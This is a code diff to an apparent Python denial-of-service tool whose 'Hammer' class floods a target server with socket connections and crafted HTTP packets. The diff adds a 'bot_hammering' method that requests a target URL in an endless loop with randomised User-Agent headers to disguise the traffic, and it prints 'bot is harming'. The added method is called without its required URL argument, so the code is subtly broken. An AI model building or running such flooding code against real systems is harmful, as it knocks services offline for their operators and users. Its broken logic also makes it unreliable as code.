@@ -2,6 +2,7 @@ from termcolor import colored
 from queue import Queue
 import sys
 import socket
+import urllib.request
 import time
 import random
 
@@ -139,7 +140,7 @@ class Hammer:
                     h_socket.shutdown(1)
                 time.sleep(.1)
         except socket.error as e:
-            print(FontColors.red("connection! server maybe down"))
+            print(FontColors.red("not connection! server maybe down"))
             time.sleep(.1)
     
     def packet_creator(self) -> str:
@@ -167,6 +168,18 @@ Connection: {DefaultHttpParameters.Headers.Connection}
         
         while True:
             self.queue_two.get()
-            pass
+            self.bot_hammering()
             self.queue_two.task_done()
     
+    def bot_hammering(self, url):
+        """Hammering with bots"""
+        
+        try:
+            while True:
+                urllib.request.urlopen(urllib.request.Request(url, \
+                headers={'User-Agent': random.choice(DefaultHttpParameters.Headers.user_agents)}))
+                print(FontColors.blue("bot is harming"))
+                time.sleep(.1)
+        except:
+            time.sleep(.1)
+        
